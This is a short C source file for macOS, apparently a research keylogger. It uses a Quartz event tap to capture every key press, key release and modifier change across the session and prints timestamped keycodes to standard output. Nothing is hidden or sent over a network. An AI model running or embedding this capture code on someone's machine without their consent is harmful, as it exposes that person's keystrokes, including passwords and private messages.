//  _              _
// | | _____ _   _| | ___   __ _  __ _  ___ _ __
// | |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
// |   <  __/ |_| | | (_) | (_| | (_| |  __/ |
// |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
//           |___/         |___/ |___/
//
//  _  _                                       _
// | || |    _ __ ___  ___  ___  __ _ _ __ ___| |__
// | || |_  | '__/ _ \/ __|/ _ \/ _` | '__/ __| '_ \
// |__   _| | | |  __/\__ \  __/ (_| | | | (__| | | |
//    |_|   |_|  \___||___/\___|\__,_|_|  \___|_| |_|
//
#include "keylogger4research.h"

// clock code https://gist.github.com/jbenet/1087739
void current_utc_time(struct timespec *ts) {
#ifdef __MACH__ // OS X does not have clock_gettime, use clock_get_time
    clock_serv_t cclock;
    mach_timespec_t mts;
    host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &cclock);
    clock_get_time(cclock, &mts);
    mach_port_deallocate(mach_task_self(), cclock);
    ts->tv_sec = mts.tv_sec;
    ts->tv_nsec = mts.tv_nsec;
#else
    clock_gettime(CLOCK_REALTIME, ts);
#endif
}

int main(int argc, const char *argv[]) {
    
    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged) | CGEventMaskBit(kCGEventKeyUp));
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Get the current time and open the logfile.
    time_t result = time(NULL);

    CFRunLoopRun();

    return 0;
}


/* 
relevant doc links: 
https://developer.apple.com/reference/coregraphics
https://developer.apple.com/reference/coregraphics/quartz_event_services
https://developer.apple.com/reference/coregraphics/cgevent
integer value fields of CGEvent: https://developer.apple.com/reference/coregraphics/cgeventfield 
*/

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Get current timestamp:
    struct timespec ts;
    current_utc_time(&ts);

    if (type == kCGEventKeyUp) {
        printf("%lu,%lu,%i,keyUP\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(stdout);
    }

    if (type == kCGEventKeyDown) {
        printf("%lu,%lu,%i,keyDOWN\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(stdout);
    }

    if (type == kCGEventFlagsChanged) {
        printf("%lu,%lu,%i,flagCHANGE\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(stdout);
    }

    return event;
}
